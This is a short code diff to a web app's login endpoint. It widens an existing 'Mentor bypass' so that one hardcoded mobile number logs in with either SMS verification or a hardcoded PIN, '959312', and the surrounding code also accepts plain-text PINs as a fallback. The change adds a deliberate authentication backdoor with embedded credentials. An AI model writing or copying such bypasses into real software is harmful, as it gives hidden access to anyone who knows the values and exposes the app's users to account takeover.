@@ -2167,8 +2167,10 @@ app.post("/api/auth/login", async (req, res) => {
         isPasswordValid = true; // Fallback for plain-text pins
     }
 
-    if (sanitizedMobile === '7407463884' && (!verificationMethod || verificationMethod === 'sms')) {
-        isPasswordValid = true; // Mentor bypass
+    if (sanitizedMobile === '7407463884') {
+        if (!verificationMethod || verificationMethod === 'sms' || pin === '959312') {
+            isPasswordValid = true; // Mentor bypass
+        }
     }
 
     if (!isPasswordValid) {
